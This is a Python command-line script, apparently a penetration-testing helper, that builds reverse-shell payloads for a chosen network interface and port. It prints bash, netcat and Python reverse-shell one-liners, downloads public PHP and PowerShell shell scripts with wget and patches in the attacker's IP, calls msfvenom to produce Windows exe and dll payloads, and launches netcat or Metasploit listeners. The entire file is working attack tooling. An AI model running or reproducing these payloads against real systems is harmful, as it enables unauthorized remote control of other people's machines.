#!/usr/bin/python3

from simple_colors import *
import os, argparse, socket

path = '/opt/autoreverse/'


ap = argparse.ArgumentParser()

ap.add_argument('-I', '--interface', required=True, type=str, help='Select the network interface.')

ap.add_argument('-P', '--port', required=True, type=str, help='Select the port you want to use.')

ap.add_argument('-p', '--payload', required=True, type=str, help='Select the payload (php, bash, nc, oldnc, exe, dll, ps1 or python).')

ap.add_argument('-l', '--listener', required=False, type=str, help='Create a listener with netcat or metasploit (nc, msf).')

args = ap.parse_args()

try:
    int(args.port)
except:
    print(red('The port must be a number'))
    exit()

def Get_IP(NT = args.interface):
    return os.popen("ifconfig " + str(NT) + " | sed -n '2 p' | awk '{print $2}'").read().replace('\n', '')

def nc_list(port = args.port, payload = args.payload):
    if args.payload == 'exe' or args.payload == '.exe' or args.payload == 'dll' or args.payload == '.dll':
        os.system('rlwrap nc -lvnp ' + str(port))
    else:
        os.system('nc -lvnp ' + str(port))

def msf_list(port = args.port, IP = Get_IP(), PORT = args.port):
    print(blue('Creating your listener on metasploit.\n'))
    print(green('Waiting to say I\'m in...\n'))
    os.system('msfconsole -q -x "use multi/handler; set payload windows/meterpreter/reverse_tcp;set LHOST ' + IP + ';set LPORT ' + PORT + '; exploit" 2>/dev/null')
        

def Check_files():
    global path
    cppath = path
    files = {
        'autoreverse.php': 'https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php', 
        'autoreverse.ps1': 'https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1'
    }
    os.system('mkdir ' + path + ' 2>/dev/null')
    for k,v in files.items():
        cppath += k
        if os.path.exists(cppath) == False:
            print('Downloading ' + blue(k) + ' on ' + path + '\n')
            os.system('wget ' + v + ' -O ' + path + k + ' 2>/dev/null')
            print(blue(k) + green(' downloaded. \n'))
        cppath = path

def Configure(IP = Get_IP(), PORT = str(args.port), payload = args.payload, msf = False, sys='64'):
    if payload.isnumeric():
        print(red('The payload must be a string.'))
        exit()
    msfvenom = 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=' + IP + ' LPORT=' + PORT + ' -f exe > autoreverse.exe 2>/dev/null'
    payload = payload.lower()
    if msf == 1:
        msfvenom.replace('shell_', 'meterpreter/')

    if payload == 'oldnc':
        print(blue('\nYour payload is:\n\n') + red('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ' + IP + ' ' + PORT + ' >/tmp/f\n'))
    elif payload == 'bash':
        print(blue('\nYour payload is:\n\n') + red('bash -i >& /dev/tcp/' + IP + '/' + PORT + ' 0>&1\n'))
    elif payload == 'nc':
        print(blue('\nYour payload is:\n\n') + red('nc -e /bin/sh ' + IP + ' ' + PORT + '\n'))
    elif payload == 'python':
        print(blue('\nYour payload is:\n\n') + red("python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"" + IP + "\"," + PORT + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n"))
    elif payload == 'php':
        Check_files()
        os.system('cp /opt/autoreverse/autoreverse.php .')
        with open('autoreverse.php', 'r') as file:
            data = file.readlines()
        with open('autoreverse.php', 'w') as file:
            data[48] = "$ip = '" + IP + "';\n"
            data[49] = "$port = " + PORT + ";\n"
            file.writelines(data)
        print(blue(('Your payload ' + red('autoreverse.php') + blue(' is located in ') + red(os.popen('pwd').read().replace('\n', '')) + blue(' and ready to upload.\n'))))
    elif payload == 'powershell' or payload == 'ps1':
        Check_files()
        os.system('cp /opt/autoreverse/autoreverse.ps1 .')
        os.system('echo "Invoke-PowerShellTcp -Reverse -IPAddress ' + IP + ' -Port ' + PORT + '" >> autoreverse.ps1')
        print(blue(('Your payload ' + red('autoreverse.ps1') + blue(' is located in ') + red(os.popen('pwd').read().replace('\n', '')) + blue(' and ready to upload.\n'))))
    elif payload == 'exe' or payload == '.exe':
        print(blue('Creating the payload, please wait.\n'))
        os.system(msfvenom)
        print(blue(('Your payload ' + red('autoreverse.exe') + blue(' is located in ') +  red(os.popen('pwd').read().replace('\n', '')) + blue(' and ready to upload.\n'))))
    elif payload == 'dll' or payload == '.dll':
        print(blue('Creating the payload, please wait.\n'))
        os.system(msfvenom.replace('exe', 'dll'))
        print(blue(('Your payload ' + red('autoreverse.dll') + blue(' is located in ') +  red(os.popen('pwd').read().replace('\n', '')) + blue(' and ready to upload.\n'))))
    else:
        print(red('You payload option is not in the list, use "--help" to know the payloads list.'))
        exit()

if args.listener != None:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    if s.connect_ex(('127.0.0.1', int(args.port))) == 0:
        print(red('The port is already in use.'))
        exit()
    if args.listener == 'nc' or args.listener == 'netcat':
        Configure()
        print(green('Waiting to say I\'m in...\n'))
        nc_list()
        exit()
    elif args.listener == 'msf' or args.listener == 'metasploit':
        msf = 1
        Configure()
        msf_list()
        exit()

Configure()
